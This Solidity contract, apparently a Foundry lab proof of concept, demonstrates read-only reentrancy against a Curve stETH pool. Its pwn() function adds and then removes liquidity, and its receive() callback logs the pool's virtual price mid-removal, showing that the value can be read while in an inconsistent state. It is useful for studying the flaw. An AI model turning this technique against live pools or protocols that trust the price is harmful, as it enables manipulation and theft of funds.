//SPDX-License-Identifier: UNLICENDED
pragma solidity 0.8.21;

import {ICurve} from "./interfaces/ICurve.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Constants} from "./Constants.sol";
import {console2} from "forge-std/Test.sol";

contract CurveHack is Constants {
    ICurve private constant POOL = ICurve(STETH_POOL);
    IERC20 private constant LP_TOKEN = IERC20(LP);

    receive() external payable {
        // get virtual price
        console2.log("during removing LP - virtual price", POOL.get_virtual_price());
    }

    function pwn() external payable {
        // add liquidity
        uint256[2] memory amounts = [msg.value, ZERO_VALUE];
        uint256 lp = POOL.add_liquidity{value: msg.value}(amounts, 1);
        // get virtual price
        console2.log("before removing LP - virtual price", POOL.get_virtual_price());
        // remove liquidity
        uint256[2] memory min_amounts = [ZERO_VALUE, ZERO_VALUE];
        POOL.remove_liquidity(lp, min_amounts);
    }
}
